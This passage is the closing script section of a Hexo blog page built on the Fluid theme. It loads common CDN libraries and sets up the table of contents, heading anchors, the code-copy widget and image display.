  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>





  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
